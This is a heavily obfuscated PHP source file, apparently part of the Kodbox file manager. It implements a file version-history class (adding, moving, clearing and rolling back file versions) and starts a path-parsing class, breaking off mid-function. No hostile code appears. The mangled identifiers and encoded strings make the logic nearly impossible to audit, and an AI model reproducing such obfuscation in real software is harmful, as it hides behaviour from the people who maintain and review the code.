<?php
 goto B¬ß·¸§¦ñ; A»òœƒ´ƒ©: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÃùÔÁôÉ =& $_SERVER[Ùæõ‰Ï’]; $§£ÚÇê¼ = $GLOBALS[$ÃùÔÁôÉ[6]][$ÃùÔÁôÉ[92]]; if ($§£ÚÇê¼[$ÃùÔÁôÉ[1314]] != 1) { return; } if ($§£ÚÇê¼[$ÃùÔÁôÉ[1315]] <= 0) { return; } if (isset($_REQUEST[$ÃùÔÁôÉ[1316]]) && $_REQUEST[$ÃùÔÁôÉ[1316]] == $ÃùÔÁôÉ[91]) { return; } Hook::bind($ÃùÔÁôÉ[1317], $ÃùÔÁôÉ[1318]); Hook::bind($ÃùÔÁôÉ[1319], $ÃùÔÁôÉ[1320]); Hook::bind($ÃùÔÁôÉ[1321], $ÃùÔÁôÉ[1322]); Hook::bind($ÃùÔÁôÉ[1323], $ÃùÔÁôÉ[1324]); Hook::bind($ÃùÔÁôÉ[1325], $ÃùÔÁôÉ[1326]); Hook::bind($ÃùÔÁôÉ[1327], $ÃùÔÁôÉ[1328]); } public static function eventBeforeUpload($÷ÆĞÑÊ“) { if ($÷ÆĞÑÊ“[3] && $÷ÆĞÑÊ“[3] != REPEAT_REPLACE) { return; } $Åıö³¯½ = self::parsePath($÷ÆĞÑÊ“[0]); if (!$Åıö³¯½) { return; } self::add($Åıö³¯½); } public static function eventBeforeEdit($‡Šç·òê) { $Â©ãÈ…® = self::parsePath($‡Šç·òê[0]); if (!$Â©ãÈ…®) { return; } self::add($Â©ãÈ…®); } public static function eventBeforeCopyFile($³ŞÁÁÛÊ, $ç‚´€çô, $ÅÂğœ¨Í, $¨Óú¨ğÃ, $¡óĞößÙ, $ŒÃÑÀó‘) { $ÃÑ–ï–Ú =& $_SERVER[Ùæõ‰Ï’]; if (isset($ÅÂğœ¨Í->_data[$ÃÑ–ï–Ú[1249]]) && $ÅÂğœ¨Í->_data[$ÃÑ–ï–Ú[1249]]) { return; } $ƒ”‡ÙºÍ = $ÅÂğœ¨Í->getPathOuter($¨Óú¨ğÃ); $ØÎ½Ñ£ï = self::parsePath($ƒ”‡ÙºÍ); if (!$ØÎ½Ñ£ï) { return; } self::add($ØÎ½Ñ£ï); } public static function eventBeforeRename($ì¢ø¥”á) { $¿¯½Ì‰­ =& $_SERVER[Ùæõ‰Ï’]; $å¶Ö‘Ì = self::parsePath($ì¢ø¥”á[0]); if (!$å¶Ö‘Ì) { return; } $éŠËšÎÎ = self::checkInHistory($å¶Ö‘Ì); if (!$éŠËšÎÎ) { return; } if ($éŠËšÎÎ[$¿¯½Ì‰­[33]] == $¿¯½Ì‰­[230]) { $­»šø’Ò = self::listData($å¶Ö‘Ì); if ($­»šø’Ò && $­»šø’Ò[$¿¯½Ì‰­[445]]) { self::moveHistory($å¶Ö‘Ì, $ì¢ø¥”á[1]); } } else { IO::rename($éŠËšÎÎ[$¿¯½Ì‰­[87]], $ì¢ø¥”á[1]); } } public static function eventBeforeMove($Ô Á°ø‰) { $˜­·á¡È =& $_SERVER[Ùæõ‰Ï’]; $ô§åûÅ¡ = self::parsePath($Ô Á°ø‰[0]); if (!$ô§åûÅ¡) { return; } $„êĞÆù­ = self::parsePath($Ô Á°ø‰[1]); if (!$„êĞÆù­) { return; } $Ú“¤°ÒÓ = $Ô Á°ø‰[3]; $¶¼…®»ª = self::checkInHistory($ô§åûÅ¡); if (!$¶¼…®»ª) { return; } $²¸¶¦öç = self::pathHistory($„êĞÆù­); if ($¶¼…®»ª[$˜­·á¡È[33]] == $˜­·á¡È[230]) { $…ÂÚ™‘ = self::listData($ô§åûÅ¡); $ÎŞ½ò‰¼ = rtrim($„êĞÆù­, $˜­·á¡È[8]) . $˜­·á¡È[8] . ($Ú“¤°ÒÓ ? $Ú“¤°ÒÓ : get_path_this($ô§åûÅ¡)); $“î™à˜Ë = self::listData($ÎŞ½ò‰¼); if ($…ÂÚ™‘ && $…ÂÚ™‘[$˜­·á¡È[445]] && $“î™à˜Ë && $“î™à˜Ë[$˜­·á¡È[445]]) { return self::clear($ô§åûÅ¡); } if ($…ÂÚ™‘ && $…ÂÚ™‘[$˜­·á¡È[445]]) { self::moveHistory($ô§åûÅ¡, $Ú“¤°ÒÓ, $²¸¶¦öç); } } else { IO::move($¶¼…®»ª[$˜­·á¡È[87]], $²¸¶¦öç, !1, $Ú“¤°ÒÓ); self::clearEmptyFolder(IO::pathFather($¶¼…®»ª[$˜­·á¡È[87]])); } } public static function eventAfterRemove($Šîß‡Éç, $¨‘Š­”¡) { $×Ó‹—²œ =& $_SERVER[Ùæõ‰Ï’]; if (!$¨‘Š­”¡) { return; } $í©´’¸í = self::parsePath($Šîß‡Éç[0]); if (!$í©´’¸í) { return; } $’¸³¬£Í = self::checkInHistory($í©´’¸í); if (!$’¸³¬£Í) { return; } if ($’¸³¬£Í[$×Ó‹—²œ[33]] == $×Ó‹—²œ[230]) { $ÈÚÚåÁÙ = self::listData($í©´’¸í, !1); if ($ÈÚÚåÁÙ && $ÈÚÚåÁÙ[$×Ó‹—²œ[445]]) { self::clear($í©´’¸í, !1); } } else { IO::remove($’¸³¬£Í[$×Ó‹—²œ[87]]); self::clearEmptyFolder(IO::pathFather($’¸³¬£Í[$×Ó‹—²œ[87]])); } } private static function checkInHistory($Ê¨ï¡Ï) { $øåÊŸêÊ = self::pathHistory($Ê¨ï¡Ï); if (!IO::exist($øåÊŸêÊ)) { $øåÊŸêÊ .= $_SERVER[Ùæõ‰Ï’][1329]; } return IO::exist($øåÊŸêÊ) ? IO::info($øåÊŸêÊ) : !1; } private static function parsePath($§„Ë„·â) { $€íœ˜‘ =& $_SERVER[Ùæõ‰Ï’]; if (!$§„Ë„·â) { return !1; } if (isset($GLOBALS[$€íœ˜‘[1330]]) && $GLOBALS[$€íœ˜‘[1330]]) { return; } $Î˜¦…Ç = KodIO::parse($§„Ë„·â); $ôÁ«çŞ = $Î˜¦…Ç[$€íœ˜‘[33]]; $°øˆ”Â = !$ôÁ«çŞ || $ôÁ«çŞ == KodIO::KOD_IO || $ôÁ«çŞ == KodIO::KOD_SHARE_ITEM; if (!$°øˆ”Â || !$Î˜¦…Ç[$€íœ˜‘[1331]]) { return !1; } if (substr($§„Ë„·â, 0, strlen(DATA_PATH . $€íœ˜‘[1332])) == DATA_PATH . $€íœ˜‘[1332]) { return !1; } if ($ôÁ«çŞ == KodIO::KOD_SHARE_ITEM) { $ëŒû Îâ = IO::init($§„Ë„·â); if ($ëŒû Îâ->pathParse[$€íœ˜‘[1245]]) { return self::parsePath($ëŒû Îâ->pathParse[$€íœ˜‘[1245]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¦Üã´ô‰ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $€íœ˜‘[1333]); foreach ($¦Üã´ô‰ as $‹‚ÑÃ½ì) { if (!$ôÁ«çŞ && substr($§„Ë„·â, 0, strlen($‹‚ÑÃ½ì)) == $‹‚ÑÃ½ì) { return !1; } } self::log($GLOBALS[$€íœ˜‘[1240]] . $€íœ˜‘[1334] . $§„Ë„·â); return $§„Ë„·â; } private static function pathHistory($§îïô¼³) { $àáõÑËñ =& $_SERVER[Ùæõ‰Ï’]; $Œ¯‚ÜŞ­ = self::$_historyBase . ltrim(KodIO::clear($§îïô¼³), $àáõÑËñ[8]); $Œ¯‚ÜŞ­ = str_replace(array($àáõÑËñ[1335]), array($àáõÑËñ[1336]), $Œ¯‚ÜŞ­); return $Œ¯‚ÜŞ­; } public static function log($ó¡ƒÍ’¥) { } public static function historyCount($×½òÃ˜³) { $İ·¦û¬ =& $_SERVER[Ùæõ‰Ï’]; $ˆËõÃà¦ = array(); $ °”ƒ› = array(); foreach ($×½òÃ˜³ as $çùèö) { $ª¦µàÊƒ = get_path_father($çùèö); if (!$ °”ƒ›[$ª¦µàÊƒ]) { $ °”ƒ›[$ª¦µàÊƒ] = array(); } $ °”ƒ›[$ª¦µàÊƒ][] = get_path_this($çùèö); } foreach ($ °”ƒ› as $ª¦µàÊƒ => $‹•ğ”) { $›šºöÙÃ = self::parsePath($ª¦µàÊƒ); if (!$›šºöÙÃ) { continue; } foreach ($‹•ğ” as $–¹‰ÃÎ) { $Êã«œ“¡ = self::listData(rtrim($›šºöÙÃ, $İ·¦û¬[8]) . $İ·¦û¬[8] . $–¹‰ÃÎ, !1); if ($Êã«œ“¡ && $Êã«œ“¡[$İ·¦û¬[445]]) { $ˆËõÃà¦[rtrim($ª¦µàÊƒ, $İ·¦û¬[8]) . $İ·¦û¬[8] . $–¹‰ÃÎ] = count($Êã«œ“¡[$İ·¦û¬[445]]); } } } return $ˆËõÃà¦; } public static function add($Ò‚Å½Á) { $†¸ç®Œ• =& $_SERVER[Ùæõ‰Ï’]; $ìŠ¾¿±Ç = self::listData($Ò‚Å½Á); if (!$ìŠ¾¿±Ç) { return; } $Œ³¼½Ÿé = Model($†¸ç®Œ•[853])->get($†¸ç®Œ•[1337]); $ƒ³ÏÑÙ´ = intval($GLOBALS[$†¸ç®Œ•[6]][$†¸ç®Œ•[92]][$†¸ç®Œ•[1315]]); $äéœĞ = $Œ³¼½Ÿé == $†¸ç®Œ•[1338] ? min(5, $ƒ³ÏÑÙ´) : $ƒ³ÏÑÙ´; if ($ƒ³ÏÑÙ´ <= 0) { return; } $¼¦ï°Ùî = IO::info($Ò‚Å½Á); $®œœ±ÉÚ = $ìŠ¾¿±Ç[$†¸ç®Œ•[445]]; if ($¼¦ï°Ùî[$†¸ç®Œ•[79]] == 0) { return; } if ($¼¦ï°Ùî[$†¸ç®Œ•[79]] >= 1024 * 1024 * 500) { return !1; } $ªèğœ´ = IO::hashSimple($Ò‚Å½Á); if ($®œœ±ÉÚ && $®œœ±ÉÚ[0][$†¸ç®Œ•[672]] == $ªèğœ´) { return !0; } if (array_key_exists($†¸ç®Œ•[233], $¼¦ï°Ùî) && !$¼¦ï°Ùî[$†¸ç®Œ•[233]]) { return !1; } $‰ĞçËï• = short_id(time()); $Êşº©†ğ = array($†¸ç®Œ•[475] => $‰ĞçËï•, $†¸ç®Œ•[672] => $ªèğœ´, $†¸ç®Œ•[32] => $¼¦ï°Ùî[$†¸ç®Œ•[32]] . $†¸ç®Œ•[10] . date($†¸ç®Œ•[1339]) . rand_string(1), $†¸ç®Œ•[79] => $¼¦ï°Ùî[$†¸ç®Œ•[79]], $†¸ç®Œ•[527] => USER_ID, $†¸ç®Œ•[231] => time(), $†¸ç®Œ•[1340] => $†¸ç®Œ•[12]); IO::mkdir($ìŠ¾¿±Ç[$†¸ç®Œ•[1341]]); $ô½Ê°Šˆ = IO::copy($Ò‚Å½Á, $ìŠ¾¿±Ç[$†¸ç®Œ•[1341]], !1, $Êşº©†ğ[$†¸ç®Œ•[32]]); if (!$ô½Ê°Šˆ) { self::clearEmptyFolder($ìŠ¾¿±Ç[$†¸ç®Œ•[1341]]); return !1; } array_unshift($®œœ±ÉÚ, $Êşº©†ğ); if (count($®œœ±ÉÚ) > $äéœĞ) { $¶äû¤ÈÍ = array_slice($®œœ±ÉÚ, $äéœĞ); foreach ($¶äû¤ÈÍ as $©¦ïúì) { IO::remove($ìŠ¾¿±Ç[$†¸ç®Œ•[1341]] . $©¦ïúì[$†¸ç®Œ•[32]]); } $®œœ±ÉÚ = array_slice($®œœ±ÉÚ, 0, $äéœĞ); } return self::saveData($ìŠ¾¿±Ç[$†¸ç®Œ•[1342]], $®œœ±ÉÚ); } public static function remove($û˜ÔÇò, $§®Á§â) { $şè²Í³ =& $_SERVER[Ùæõ‰Ï’]; $¿ã¥‡˜“ = self::listData($û˜ÔÇò); $œ¬ËÆÖµ = array(); if (!$¿ã¥‡˜“) { return !1; } foreach ($¿ã¥‡˜“[$şè²Í³[445]] as $‰’ï½²Æ) { if ($‰’ï½²Æ[$şè²Í³[475]] == $§®Á§â) { IO::remove($¿ã¥‡˜“[$şè²Í³[1341]] . $‰’ï½²Æ[$şè²Í³[32]]); continue; } $œ¬ËÆÖµ[] = $‰’ï½²Æ; } return self::saveData($¿ã¥‡˜“[$şè²Í³[1342]], $œ¬ËÆÖµ); } public static function clear($ïëñ´Ò, $©¼ê³»´ = true) { $½áü±« =& $_SERVER[Ùæõ‰Ï’]; $ÏÔ•¼Ş¼ = self::listData($ïëñ´Ò, $©¼ê³»´); if (!$ÏÔ•¼Ş¼) { return !1; } foreach ($ÏÔ•¼Ş¼[$½áü±«[445]] as $à˜»çÙ) { IO::remove($ÏÔ•¼Ş¼[$½áü±«[1341]] . $à˜»çÙ[$½áü±«[32]]); } return self::saveData($ÏÔ•¼Ş¼[$½áü±«[1342]], array()); } public static function moveHistory($íµºÂ¡¯, $ÛÖüé‚È = '', $ˆ‡ÛÔ‚„ = '') { $«Ìş®‹Ú =& $_SERVER[Ùæõ‰Ï’]; $ †å¤ª = self::listData($íµºÂ¡¯, !1); if (!$ †å¤ª || !$ †å¤ª[$«Ìş®‹Ú[445]]) { return !1; } $½áøœ“ó = $«Ìş®‹Ú[1329]; $ÛÖüé‚È = $ÛÖüé‚È ? $ÛÖüé‚È : get_path_this($íµºÂ¡¯); $ˆ‡ÛÔ‚„ = $ˆ‡ÛÔ‚„ ? $ˆ‡ÛÔ‚„ : $ †å¤ª[$«Ìş®‹Ú[1341]]; $è½¸‚¥ = substr(get_path_this($ †å¤ª[$«Ìş®‹Ú[1342]]), 0, -strlen($½áøœ“ó)); foreach ($ †å¤ª[$«Ìş®‹Ú[445]] as $ÙßìşİŸ => $ø»åÍÍ×) { $éÒ¨‡Š° = $ÛÖüé‚È . substr($ø»åÍÍ×[$«Ìş®‹Ú[32]], strlen($è½¸‚¥)); $İÂ½êÍ = IO::move($ †å¤ª[$«Ìş®‹Ú[1341]] . $ø»åÍÍ×[$«Ìş®‹Ú[32]], $ˆ‡ÛÔ‚„, !1, $éÒ¨‡Š°); if ($İÂ½êÍ) { $ †å¤ª[$«Ìş®‹Ú[445]][$ÙßìşİŸ][$«Ìş®‹Ú[32]] = $éÒ¨‡Š°; } } $ †å¤ª[$«Ìş®‹Ú[1342]] = IO::move($ †å¤ª[$«Ìş®‹Ú[1342]], $ˆ‡ÛÔ‚„, !1, $ÛÖüé‚È . $½áøœ“ó); self::saveData($ †å¤ª[$«Ìş®‹Ú[1342]], $ †å¤ª[$«Ìş®‹Ú[445]]); self::clearEmptyFolder($ †å¤ª[$«Ìş®‹Ú[1341]]); } public static function rollback($Ëºû›È, $—ò‰ŞÓÏ) { $ÅÆÕˆüÌ =& $_SERVER[Ùæõ‰Ï’]; $–®Àáİ— = self::listData($Ëºû›È); if (!$–®Àáİ—) { return; } $ƒ€ºÊ¬ = IO::info($Ëºû›È); foreach ($–®Àáİ—[$ÅÆÕˆüÌ[445]] as $°»İƒ«» => $ÇÙÁª¤û) { if ($ÇÙÁª¤û[$ÅÆÕˆüÌ[475]] == $—ò‰ŞÓÏ) { self::add($Ëºû›È); $«¿ŞšæÅ = $–®Àáİ—[$ÅÆÕˆüÌ[1341]] . $ÇÙÁª¤û[$ÅÆÕˆüÌ[32]]; $ü†ÆË¶Ê = IO::copy($«¿ŞšæÅ, IO::pathFather($Ëºû›È), REPEAT_REPLACE, $ƒ€ºÊ¬[$ÅÆÕˆüÌ[32]]); if ($ü†ÆË¶Ê) { self::remove($Ëºû›È, $—ò‰ŞÓÏ); } return $ü†ÆË¶Ê; } } return !1; } public static function setDetail($åèÅª™À, $‰½ŠÁğò, $êÜİˆ¯§) { $Î‡ªÛùª =& $_SERVER[Ùæõ‰Ï’]; $Ñ„Â‚§Í = self::listData($åèÅª™À); if (!$Ñ„Â‚§Í) { return; } foreach ($Ñ„Â‚§Í[$Î‡ªÛùª[445]] as $ÍÈÚ½­© => $‰†ï½Êß) { if ($‰†ï½Êß[$Î‡ªÛùª[475]] == $‰½ŠÁğò) { $Ñ„Â‚§Í[$Î‡ªÛùª[445]][$ÍÈÚ½­©][$Î‡ªÛùª[1340]] = $êÜİˆ¯§; self::saveData($Ñ„Â‚§Í[$Î‡ªÛùª[1342]], $Ñ„Â‚§Í[$Î‡ªÛùª[445]]); return !0; } } return !1; } public static function fileInfo($Ö‚ø˜Ø„, $ŞÉ±ˆéº) { $ÄËˆÂ–Ô =& $_SERVER[Ùæõ‰Ï’]; $“ÉèÆÄû = self::listData($Ö‚ø˜Ø„); if (!$“ÉèÆÄû) { show_json(LNG($ÄËˆÂ–Ô[108]), !1); } $âä»Ø´´ = $ÄËˆÂ–Ô[12]; foreach ($“ÉèÆÄû[$ÄËˆÂ–Ô[445]] as $ìà½£ÇŒ => $ä·„‹’¸) { if ($ä·„‹’¸[$ÄËˆÂ–Ô[475]] != $ŞÉ±ˆéº) { continue; } $âä»Ø´´ = $“ÉèÆÄû[$ÄËˆÂ–Ô[1341]] . $ä·„‹’¸[$ÄËˆÂ–Ô[32]]; break; } if (!$âä»Ø´´) { show_json(LNG($ÄËˆÂ–Ô[108]), !1); } return IO::info($âä»Ø´´); } public static function fileOut($Ö™¹®Öï, $àèÒãú, $™ÛËóøø = false) { $âŞ³É»’ =& $_SERVER[Ùæõ‰Ï’]; $¾åµ¥¤š = self::fileInfo($Ö™¹®Öï, $àèÒãú); $³…‡±Ü =& $GLOBALS[$âŞ³É»’[7]]; $™ÛËóøø = isset($³…‡±Ü[$âŞ³É»’[1292]]) && $³…‡±Ü[$âŞ³É»’[1292]] == 1; if (isset($³…‡±Ü[$âŞ³É»’[33]]) && $³…‡±Ü[$âŞ³É»’[33]] == $âŞ³É»’[1343]) { return IO::fileOutImage($¾åµ¥¤š[$âŞ³É»’[87]], $³…‡±Ü[$âŞ³É»’[1344]]); } IO::fileOut($¾åµ¥¤š[$âŞ³É»’[87]], $™ÛËóøø, get_path_this($Ö™¹®Öï)); } public static function listData($«œ”¹¾¢, $ˆ¾üï½Ÿ = true) { $öß–Ğ¢ =& $_SERVER[Ùæõ‰Ï’]; if ($ˆ¾üï½Ÿ && !IO::exist($«œ”¹¾¢)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($«œ”¹¾¢, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ä¿Î£Û¢ = self::pathHistory($«œ”¹¾¢); $ÌË´†à™ = array($öß–Ğ¢[1342] => $ä¿Î£Û¢ . $öß–Ğ¢[1329], $öß–Ğ¢[1341] => rtrim(get_path_father($ä¿Î£Û¢), $öß–Ğ¢[8]) . $öß–Ğ¢[8], $öß–Ğ¢[445] => array()); $ÚåĞˆ¨Ñ = IO::getContent($ÌË´†à™[$öß–Ğ¢[1342]]); if ($ÚåĞˆ¨Ñ) { $‹¹ƒ÷® = json_decode($ÚåĞˆ¨Ñ, !0); if (is_array($‹¹ƒ÷®)) { $ÌË´†à™[$öß–Ğ¢[445]] = $‹¹ƒ÷®; } } return $ÌË´†à™; } private static function saveData($åÕªÂº™, $„‰½áğÍ) { $ß½Ñ–îó =& $_SERVER[Ùæõ‰Ï’]; self::log($ß½Ñ–îó[1345] . $åÕªÂº™ . $ß½Ñ–îó[74] . count($„‰½áğÍ), $ß½Ñ–îó[835]); if ($„‰½áğÍ) { return IO::setContent($åÕªÂº™, json_encode($„‰½áğÍ)); } $Ê¼ÚÂÕü = IO::pathFather($åÕªÂº™); IO::remove($åÕªÂº™); self::clearEmptyFolder($Ê¼ÚÂÕü); return !0; } public static function clearEmptyFolder($ŸÒ­ËÏè) { $¾â–œ¥ =& $_SERVER[Ùæõ‰Ï’]; if (trim($ŸÒ­ËÏè, $¾â–œ¥[8]) == trim(self::$_historyBase, $¾â–œ¥[8])) { return; } $ÏâÉÓİ = IO::pathFather($ŸÒ­ËÏè); $Ê¥¢ = IO::has($ŸÒ­ËÏè, !0); if ($Ê¥¢[$¾â–œ¥[239]] > 0 || $Ê¥¢[$¾â–œ¥[240]] > 0) { return; } IO::remove($ŸÒ­ËÏè); self::clearEmptyFolder($ÏâÉÓİ); } private static function getBasePath() { $«æëû£œ =& $_SERVER[Ùæõ‰Ï’]; $çÍ‘ºô = Model($«æëû£œ[1346])->get($«æëû£œ[1347]); if ($çÍ‘ºô) { if (!IO::exist($çÍ‘ºô)) { IO::mkdir($çÍ‘ºô); } if (get_path_this($çÍ‘ºô) == $«æëû£œ[1332]) { $õ¼²ô’¢ = $«æëû£œ[1348] . rand_string(8); @rename($çÍ‘ºô, get_path_father($çÍ‘ºô) . $«æëû£œ[8] . $õ¼²ô’¢); $çÍ‘ºô = DATA_PATH . $õ¼²ô’¢ . $«æëû£œ[8]; file_put_contents(DATA_PATH . $«æëû£œ[1279], $«æëû£œ[12]); Model($«æëû£œ[1346])->set($«æëû£œ[1347], $çÍ‘ºô); } return $çÍ‘ºô; } $çÍ‘ºô = DATA_PATH . $«æëû£œ[1348] . rand_string(8) . $«æëû£œ[8]; $çÍ‘ºô = IO::mkdir($çÍ‘ºô); $çÍ‘ºô = rtrim($çÍ‘ºô, $«æëû£œ[8]) . $«æëû£œ[8]; file_put_contents($çÍ‘ºô . $«æëû£œ[1279], $«æëû£œ[12]); file_put_contents(DATA_PATH . $«æëû£œ[1279], $«æëû£œ[12]); Model($«æëû£œ[1346])->set($«æëû£œ[1347], $çÍ‘ºô); return $çÍ‘ºô; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\x52\145\143\171\143\x6c\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\x69\154\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\x46\151\154\145\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\122\x6f\x6f\x74\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\150\141\162\145\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\150\x61\162\x65\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\145\x49\164\145\155\114\151\156\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\154\157\143\153\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\162\x52\145\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\x72\x7d"; public static function typeList() { $ Î°·› =& $_SERVER[Ùæõ‰Ï’]; return array($ Î°·›[1349] => self::KOD_SOURCE, $ Î°·›[1350] => self::KOD_USER_RECYCLE, $ Î°·›[1351] => self::KOD_USER_FAV, $ Î°·›[1352] => self::KOD_USER_FILE_TAG, $ Î°·›[1353] => self::KOD_USER_FILE_TYPE, $ Î°·›[1354] => self::KOD_GROUP_ROOT_SELF, $ Î°·›[1355] => self::KOD_USER_SHARE, $ Î°·›[1356] => self::KOD_USER_SHARE_LINK, $ Î°·›[1357] => self::KOD_USER_SHARE_TO_ME, $ Î°·›[1358] => self::KOD_SHARE_ITEM, $ Î°·›[1359] => self::KOD_SHARE_LINK, $ Î°·›[1360] => self::KOD_SEARCH, $ Î°·›[1361] => self::KOD_BLOCK, $ Î°·›[1362] => self::KOD_IO, $ Î°·›[1363] => self::KOD_USER_RECENT, $ Î°·›[1364] => self::KOD_USER_DRIVER); } public static function parse($‹’ ¾…µ) { $ºŞˆ——“ =& $_SERVER[Ùæõ‰Ï’]; $‹’ ¾…µ = self::clear($‹’ ¾…µ); $¯ÖÊÚ°å = array_values(self::typeList()); preg_match($ºŞˆ——“[1365], $‹’ ¾…µ, $ñÏ«´ª); $–³Â¸ó = array($ºŞˆ——“[496] => !1, $ºŞˆ——“[1366] => !1, $ºŞˆ——“[493] => !1, $ºŞˆ——“[87] => $‹’ ¾…µ, $ºŞˆ——“[1264] => !1, $ºŞˆ——“[1263] => $ºŞˆ——“[12]); if (is_array($ñÏ«´ª) && count($ñÏ«´ª) == 5) { $Ô’ö¿Ø÷ = $ºŞˆ——“[1367] . $ñÏ«´ª[2] . $ºŞˆ——“[403]; if (in_array($Ô’ö¿Ø÷, $¯ÖÊÚ°å)) { $–³Â¸ó[$ºŞˆ——“[1264]] = $ñÏ«´ª[1]; $–³Â¸ó[$ºŞˆ——“[33]] = $Ô’ö¿Ø÷; $–³Â¸ó[$ºŞˆ——“[1368]] = substr($Ô’ö¿Ø÷, 1, -1); $–³Â¸ó[$ºŞˆ——“[475]] = $ñÏ«´ª[3]; } $–³Â¸ó[$ºŞˆ——“[1263]] = $ñÏ«´ª[4]; } $§§ ¤  = array($ºŞˆ——“[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $–³Â¸ó[$ºŞˆ——“[1331]] = in_array($–³Â¸ó[$ºŞˆ——“[33]], $§§ ¤ ); return $–³Â¸ó; } public static function isTruePath($­‘øÑ£â) { $ÂÊôòÙ­ =& $_SERVER[Ùæõ‰Ï’]; if (substr($­‘øÑ£â, 0, 1) != $ÂÊôòÙ­[1367]) { return !0; } if (strpos($­‘øÑ£â, $ÂÊôòÙ­[483]) === 0) { return !0; } if (strpos($­‘øÑ£â, $ÂÊôòÙ­[1335]) === 0) { return !0; } if (strpos($­‘øÑ£â, $ÂÊôòÙ­[1369]) === 0) { return !0; } if (strpos($­‘øÑ£â, $ÂÊôòÙ­[1370]) === 0) { return !0; } if (strpos($­‘øÑ£â, $ÂÊôòÙ­[1371]) === 0) { return !0; } return !1; } public static function clear($Ç¯¶÷Ì) { $Ãç÷Ù–Ë =& $_SERVER[Ùæõ‰Ï’]; $Ç¯¶÷Ì = str_replace(array($Ãç÷Ù–Ë[1170], $Ãç÷Ù–Ë[262]), $Ãç÷Ù–Ë[53], $Ç¯¶÷Ì); $Ç¯¶÷Ì = str_replace($Ãç÷Ù–Ë[100], $Ãç÷Ù–Ë[8], $Ç¯¶÷Ì); $¹«ùßãÀ = $Ãç÷Ù–Ë[1372]; if (substr($Ç¯¶÷Ì, 0, 3) == $Ãç÷Ù–Ë[1373]) { $Ç¯¶÷Ì = substr($Ç¯¶÷Ì, 3); } while (strstr($Ç¯¶÷Ì, $¹«ùßãÀ)) { $Ç¯¶÷Ì = str_replace($¹«ùßãÀ, $Ãç÷Ù–Ë[8], $Ç¯¶÷Ì); } $Ç¯¶÷Ì = preg_replace($Ãç÷Ù–Ë[1374], $Ãç÷Ù–Ë[8], $Ç¯¶÷Ì); if ($Ç¯¶÷Ì == $Ãç÷Ù–Ë[8]) { return $Ãç÷Ù–Ë[8]; } $Ç¯¶÷Ì = rtrim($Ç¯¶÷Ì, $Ãç÷Ù–Ë[8]); return $Ç¯¶÷Ì; } public static function pathTrue($ˆ«—„ôÎ) { $­…–³‘¸ =& $_SERVER[Ùæõ‰Ï’]; if (!$ˆ«—„ôÎ) { return $­…–³‘¸[12]; } $ˆ«—„ôÎ = str_replace($­…–³‘¸[592], $­…–³‘¸[8], str_replace($­…–³‘¸[1375], $­…–³‘¸[8], $ˆ«—„ôÎ)); $ˆ«—„ôÎ = str_replace($­…–³‘¸[592], $­…–³‘¸[8], str_replace($­…–³‘¸[1375], $­…–³‘¸[8], $ˆ«—„ôÎ)); if (!strstr($ˆ«—„ôÎ, $­…–³‘¸[1373])) { return $ˆ«—„ôÎ; } $º„â§¯ = explode($­…–³‘¸[8], $ˆ«—„ôÎ); foreach ($º„â§¯ as $ßšÃÙÒ‡ => $˜ò³•Ûî) { if ($˜ò³•Ûî !== $­…–³‘¸[1376]) { continue; } for ($£ƒí‰¤ = $ßšÃÙÒ‡; $£ƒí‰¤ >= 0; $£ƒí‰¤--) { if ($º„â§¯[$£ƒí‰¤] === $­…–³‘¸[10] || $º„â§¯[$£ƒí‰¤] === $­…–³‘¸[1376] || $º„â§¯[$£ƒí‰¤] === -1) { continue; } if ($º„â§¯[$£ƒí‰¤] === $­…–³‘¸[12]) { $º„â§¯[$ßšÃÙÒ‡] = -1; break; } $º„â§¯[$ßšÃÙÒ‡] = -1; $º„â§¯[$£ƒí‰¤] = -1; break; } } $Ëºº™²¶ = array(); foreach ($º„â§¯ as $˜ò³•Ûî) { if ($˜ò³•Ûî !== -1) { $Ëºº™²¶[] = $˜ò³•Ûî; } } $ÚùÁëÈ¯ = implode($­…–³‘¸[8], $Ëºº™²¶); if (strpos($ÚùÁëÈ¯, $­…–³‘¸[1377]) === 0) { $ÚùÁëÈ¯ = $­…–³‘¸[1373] . substr($ÚùÁëÈ¯, strlen($­…–³‘¸[1377])); } return $ÚùÁëÈ¯; } public static function pathUrlClear($›ñ¸À“Ÿ) { $¢Éùû Æ =& $_SERVER[Ùæõ‰Ï’]; if (!$›ñ¸À“Ÿ) { return $›ñ¸À“Ÿ; } $›ñ¸À“Ÿ = rawurldecode($›ñ¸À“Ÿ); $›ñ¸À“Ÿ = str_replace($¢Éùû Æ[1375], $¢Éùû Æ[8], $›ñ¸À“Ÿ); if (strpos($›ñ¸À“Ÿ, $¢Éùû Æ[76]) > 0) { $›ñ¸À“Ÿ = substr($›ñ¸À“Ÿ, 0, strpos($›ñ¸À“Ÿ, $¢Éùû Æ[76])); } if (strpos($›ñ¸À“Ÿ, $¢Éùû Æ[1378]) > 0) { $›ñ¸À“Ÿ = substr($›ñ¸À“Ÿ, 0, strpos($›ñ¸À“Ÿ, $¢Éùû Æ[1378])); 